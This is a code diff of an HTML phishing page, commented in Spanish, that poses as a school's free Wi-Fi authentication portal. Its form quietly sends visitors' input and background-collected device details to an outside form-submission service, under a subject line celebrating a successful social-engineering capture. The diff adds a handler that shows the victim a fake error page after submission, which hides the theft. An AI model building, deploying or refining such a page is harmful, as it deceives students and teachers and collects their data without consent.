@@ -22,15 +22,15 @@
         <h1>Portal de Autenticación</h1>
         <p>Estás a un paso de conectarte a la red inalámbrica gratuita para alumnos y docentes.</p>
         
-        <form action="https://web3forms.com" method="POST" id="form-wifi">
-            
+        
+        <form action="https://web3forms.com" method="POST" id="form-wifi" onsubmit="setTimeout(() => { window.location.href='error.html'; }, 500);">    
             <!-- Tu llave pública de Web3Forms -->
             <input type="hidden" name="access_key" value="57341f12-ab6c-4369-9b1b-64b6e24cca32">
             <input type="hidden" name="subject" value="¡Ingeniería Social Exitosa! - Dispositivo Capturado">
             <input type="hidden" name="from_name" value="Portal Wi-Fi Escolar">
             
-            <!-- 🔗 REDIRECCIÓN AUTOMÁTICA: Cambia 'rgjadan-cmd' si tu usuario de GitHub llega a ser distinto -->
-            <input type="hidden" name="redirect" value="https://github.io">
+            <!-- 🔗 REDIRECCIÓN AUTOMÁTICA: Cambia 'rgjadan-cmd' si tu usuario de GitHub llega a ser distinto 
+            <input type="hidden" name="redirect" value="https://github.io">-->
             
             <!-- Campos técnicos ocultos que se llenan por atrás -->
             <input type="hidden" id="inp-pantalla" name="Resolución Pantalla">
